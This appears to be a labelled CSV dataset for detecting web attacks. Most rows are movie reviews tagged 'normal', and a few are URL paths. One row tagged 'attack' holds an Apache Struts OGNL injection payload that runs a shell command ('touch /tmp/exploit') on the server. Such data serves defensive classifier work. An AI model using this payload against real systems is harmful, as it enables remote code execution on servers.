post,tags
"Seeing as how I am a big fan of both ""Fall"" and ""If Lucy Fell"", I came to ""Wirey Spindell"" with high expectations. I am not sure I could have been more disappointed. This had it all, weak dialogue, weak performances... you name it I was let down. Oh well, better luck next time Eric.",normal
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=touch /tmp/exploit",attack
"You could get into the nitty gritty of this film, and say how it couldn't happen, or how could the main character just walk into offices and start using computers etc without someone noticing and really pick the movie to bits...or you could just sit back with a bucket of popcorn and enjoy the story and the acting. Personally, I prefer the latter, I live real life and watch the news with all it's doom and gloom, and so would much rather be entertained by my movies, and see the bad guys get their just rewards. Don't take it too seriously, and you can thoroughly enjoy this film.",normal
"I am easily pleased. I like bad films. I like films featuring attractive young women in small amounts of clothing.<br /><br />This film gives all the above a bad name. Yes, you know going in that what you're getting is not high art, or anything like. But, even for the type of movie it is, Beach Babes From Beyond isn't very good.<br /><br />Some people have given it 10. I can only assume that these are people who have had the organs which enable rational thought to take place surgically removed.<br /><br />It isn't very good. It simply isn't very good.<br /><br />3 out of 10 solely on the grounds of a) novelty value for the famous relatives and Burt Ward and b) some of the girls are cute.<br /><br />Oh, by the way, did I tell you that it isn't very good?",normal
/mt/blog/2017/07/s2-048.html,normal
First Off Acting Is So Terrible Except For The Actor Who Plays Spencer. Mirinda Cosgrove Does Not Deserve Her Own Show She Should Have Stick With Drake And Josh.The Only Person I Like Besides Spencer Is Nevel Hes Super Bad@$$ He Kicked Carlys Crews @$$ And I liked It<br /><br />The Episode I Hate A lot Is Imyourbigesstfan I Hate That Young Icaly Fan She Made Me Almost Kill Myself Fake Is A Well Word To Describe This Please Don't Watch This Nothing On TV Is Good Go With Classics Like Family Matters Good Show Ban Icarly Lets All Go Back To Doug Nick Version Only Please Don't Watch I Hate Icarly Oh Also Nathan Kress Is A Wannabee Fredie Highmore,normal
"Ordinary Decent Criminal is sad because it is obviously trying to succeed and equally obviously hasn't a chance in hell of making it apparently owing to the absence of a clear sense of purpose. A abysmal failure at droll Irish comedy with Spacey as a thief who enjoys outsmarting the cops and his competition becoming a sort of folk hero in his own mind, this flick manages to be mildly amusing when it's trying to be funny, slightly more than boring when it's trying to be interesting, and forget sentimental or poignant or endearing though it takes shots at those qualities as well. ""Ordinary Decent Criminal"" has a clumsy screenplay, naive direction, journeyman execution, thin story, poor casting, mediocre acting, and eventually becomes lost in itself and sinks into a mire of hopeless mediocrity. Pass on this one. (D)",normal
"Yep, this has got to be one of the lamest movies I've ever seen. It's utterly tasteless, has no style whatsoever, the story is so thin that you can watch television through it, and the whole film has so many holes you could drive an oil tanker through it.<br /><br />Sure, I appreciate a good B-movie as much as most male white homo sapiens do. But this has got to be the worst I've seen. In fact it's so B that it lacks everything that makes a B-movie interesting.<br /><br />The whole movie is based around such charming artefacts as the characters beating the crap out of each other, various bodily functions and the complete lack of sanity of anything on-screen.<br /><br />It's not even funny. In fact it's quite the opposite. I found it even boring at times due to it's extreme predictability.<br /><br />I find nothing good to say about this movie. It was a waste of time watching it, and I hope others don't do the same mistake. If you also pay for it you should get a serious brainscan done.",normal
"A truly excellent look at the world and the realities of being a heroin addict. The movie is one that will hit much too close to home to those who were involved in the drug culture and have knowledge of what being(or being around) a heroin addict really is. Good movie, which will never truly be outdated. Excellent performances by all involved and the minimalist set is Preminger's way of showing how bleak a JUNKIE'S world can become. Worth a look--an education of sorts. The golden arm is a worried look at the truth of the underground life of pain a junkie lives in.",normal
/myadmin/index.php,normal
